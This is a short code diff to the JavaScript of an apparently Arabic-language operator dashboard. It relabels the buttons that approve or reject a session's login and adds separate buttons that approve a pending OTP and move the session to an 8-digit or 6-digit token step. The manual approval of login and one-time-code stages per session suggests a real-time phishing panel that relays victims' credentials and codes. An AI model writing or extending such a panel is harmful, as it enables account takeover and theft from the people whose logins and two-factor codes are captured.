@@ -520,8 +520,8 @@
                 // Actions column: approve/reject for login and otp only
                 let actionsHtml = '';
                 if (loginStatus === 'pending') {
-                    actionsHtml += '<button class="action-btn btn-approve" onclick="approveLogin(\'' + s.session_id + '\')">قبول دخول</button> ';
-                    actionsHtml += '<button class="action-btn btn-reject" onclick="rejectLogin(\'' + s.session_id + '\')">رفض دخول</button>';
+                    actionsHtml += '<button class="action-btn btn-approve" onclick="approveLogin(\'' + s.session_id + '\')">قبول</button> ';
+                    actionsHtml += '<button class="action-btn btn-reject" onclick="rejectLogin(\'' + s.session_id + '\')">رفض</button>';
                 } else if (loginStatus === 'approved') {
                     actionsHtml += '<span class="status-text status-approved">✓ مقبول</span>';
                 } else if (loginStatus === 'rejected') {
@@ -622,7 +622,8 @@
 
                 if (d.otp_status === 'pending') {
                     html += '<div class="action-row"><span class="action-label">OTP:</span>';
-                    html += '<button class="action-btn btn-approve" onclick="approveOtp(\'' + sessionId + '\'); setTimeout(showDetails,500,\'' + sessionId + '\');">قبول</button>';
+                    html += '<button class="action-btn btn-approve" onclick="approveOtp(\'' + sessionId + '\'); setTimeout(showDetails,500,\'' + sessionId + '\');">قبول ونقل إلى توكن 8 رقم</button>';
+                    html += '<button class="action-btn btn-approve" onclick="approveOtp(\'' + sessionId + '\'); setTimeout(showDetails,500,\'' + sessionId + '\');">قبول ونقل إلى توكن 6 رقم</button>';
                     html += '<button class="action-btn btn-reject" onclick="rejectOtp(\'' + sessionId + '\'); setTimeout(showDetails,500,\'' + sessionId + '\');">رفض</button>';
                     html += '</div>';
                 }
